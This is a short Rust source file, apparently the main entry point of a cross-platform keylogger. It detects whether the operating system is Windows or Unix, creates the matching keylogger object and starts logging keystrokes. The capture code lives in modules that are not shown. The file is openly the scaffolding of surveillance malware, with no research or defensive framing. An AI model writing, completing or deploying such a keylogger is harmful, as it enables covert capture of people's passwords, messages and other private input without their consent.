use std::env::consts;

mod linux;
mod windows;

use linux::keylogger::Keylogger as LinuxKl;
use windows::keylogger::Keylogger as WindowsKl;

pub trait Common {
    fn start_logging(&self);
}

fn main() {
    let os = consts::FAMILY;

    let keylogger: Box<dyn Common> = if os.contains("windows") {
        Box::new(WindowsKl::new()) }
    else if os.contains("unix") {
        Box::new(LinuxKl { })
    } else {
        panic!()
    };

    keylogger.start_logging();
}
